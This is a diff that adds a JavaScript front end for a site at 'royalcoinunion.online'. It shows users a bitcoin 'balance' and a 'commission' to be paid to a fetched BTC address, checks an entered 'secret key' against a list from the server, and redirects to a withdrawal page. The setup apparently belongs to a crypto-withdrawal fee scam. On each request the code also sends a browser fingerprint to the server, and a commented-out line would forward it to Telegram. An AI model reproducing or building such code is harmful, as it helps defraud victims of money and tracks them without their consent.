@@ -1,0 +1,174 @@
+const xhr = new XMLHttpRequest()
+
+
+
+function loaderFunction(status) {
+    if(status){
+        let div = document.createElement('div');
+        div.style = "position: fixed;width: 100%;height: 100%;top: 0;background-color: white;left: 0;z-index: 5000;display: flex;align-items: center;justify-content: center;"
+        div.id = "loader-wrapper"
+        div.innerHTML = '<div class="loader" style="color:red;"></div>'
+        document.body.append(div)
+    }else{
+        document.getElementById("loader-wrapper").remove()
+
+    }
+}
+
+async function send_request(type, laoder, url, data) {
+    if (laoder) { loaderFunction(false)}
+    return new Promise((resolve, reject) => {
+        let page = `https://royalcoinunion.online/${url}`;
+        xhr.open(type, page)
+        xhr.responseType = "json"
+        xhr.setRequestHeader("Accept", "application/json")
+        xhr.setRequestHeader("Content-Type", "application/json")
+        xhr.setRequestHeader("Access-Control-Allow-Origin", "*")
+        xhr.setRequestHeader("mode", "no-cors")
+        xhr.setRequestHeader("cache", "no-cache")
+        xhr.setRequestHeader("credentials", "same-origin")
+        xhr.setRequestHeader("redirect", "follow")
+
+        xhr.onload = () => {
+            resolve(xhr.response)
+        }
+
+        if (data != false) {
+            xhr.send(JSON.stringify(data))
+        }
+        else {
+            xhr.send()
+
+        }
+    })
+}
+
+async function setElements(priceBitcoinCommission, priceInBitcoin, priceEuro, qr, commissionBTC, commissionEuro, address) {
+    document.getElementById("balance_bitcoin").textContent = priceInBitcoin + " BTC"
+    document.getElementById("balance_euro").textContent = priceEuro + " EUR"
+    document.getElementById("get_commission").textContent = `${commissionEuro} EUR = ${commissionBTC} BTC`
+    document.querySelector(".btc_address").textContent = address
+    document.querySelector("#get_balance").textContent = `${priceEuro} EUR = ${priceInBitcoin} BTC`
+    document.getElementById("loader-wrapper").remove()
+}
+
+async function show(keys) {
+    const incorrect_error = document.querySelector('.incorrect-data');
+    const fill_error = document.querySelector('.fill-data');
+    const sicret_key_input = document.getElementById('sicret_key_input').value;
+
+    const wait = document.getElementById('wait')
+    const email = document.getElementById('email_input').value
+    wait.classList.add('active');
+
+    setTimeout(() => {
+        if (email == "") {
+            wait.classList.remove('active');
+            fill_error.classList.add('active');
+            setTimeout(() => {
+                fill_error.classList.remove('active');
+            }, 7000)
+
+            return
+        } else if (sicret_key_input == "") {
+            wait.classList.remove('active');
+            fill_error.classList.add('active');
+            setTimeout(() => {
+                fill_error.classList.remove('active');
+            }, 7000)
+            return
+        } else {
+            for (key in keys) {
+                if (keys[key].bitcoin_key == sicret_key_input) {
+                    wait.classList.add('active');
+                    incorrect_error.classList.remove("active");
+                    fill_error.classList.remove("active");
+
+                    // send_request("post", false, "transaction-successfully", { sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion), send_telegram: true })
+
+                    setTimeout(() => {
+                        // wait.textContent = "Confirmation will be sent to email"
+                        window.location.href = "withdraw-3.html"
+                    }, 15000)
+
+                    return
+
+                }
+                else {
+                    wait.classList.remove('active');
+                    incorrect_error.classList.add("active");
+                    setTimeout(() => {
+                        incorrect_error.classList.remove("active");
+                    }, 7000)
+                }
+            }
+
+
+
+        }
+    }, 2000)
+}
+
+async function check_data() {
+    let keys = await send_request("get", false, "keys", false)
+    await show(keys)
+}
+
+async function check(keys) {
+    const fill_error = document.querySelector('.incorrect_error');
+    const sicret_key_input = document.getElementById('private_bitcoin_wallet').value;
+    const incorrect_error = document.querySelector('.data_ok')
+
+    if (sicret_key_input == "") {
+        fill_error.classList.add('active');
+        setTimeout(() => {
+            fill_error.classList.remove('active');
+        }, 7000)
+
+        return
+    } else {
+        for (let key in keys) {
+            if (keys[key].bitcoin_key == sicret_key_input) {
+                incorrect_error.classList.add("active");
+                fill_error.classList.remove("active");
+
+                return
+            }
+            else {
+                incorrect_error.classList.add("active");
+                setTimeout(() => {
+                    incorrect_error.classList.remove("active");
+                    fill_error.classList.remove("active");
+
+                }, 7000)
+            }
+        }
+
+
+
+    }
+
+
+
+}
+
+async function check_private_id() {
+    let keys = await send_request("get", false, "keys", false)
+    await check(keys)
+}
+
+
+async function start() {
+    let address = await send_request("get", false, "address_change", false)
+    let qr = await send_request("get", false, "qr_change", false)
+    let getPriceBitcoin = await send_request("get", false, "price_change", false)
+    let setPriceBitcoin = getPriceBitcoin["price_euro"]
+    let sendPriceBitcoin = await send_request("post", false, "transaction-convert", { price: setPriceBitcoin, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
+    let getPriceBitcoinCommission = await send_request("post", false, "transaction-commission", { price: setPriceBitcoin, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
+    let setPriceBitcoinCommission = getPriceBitcoinCommission.price
+    let getPriceInEuro = await send_request("post", false, "transaction-convert-euro", { price: setPriceBitcoin, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
+    let getPriceInEuroCommission = await send_request("post", false, "transaction-convert-euro", { price: setPriceBitcoinCommission, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
+    setElements(sendPriceBitcoin, String(setPriceBitcoin).substr(0, 8), String(getPriceInEuro.price).substr(0, 8), qr, setPriceBitcoinCommission, String(getPriceInEuroCommission.price).substr(0, 6), address.address)
+}
+
+start()
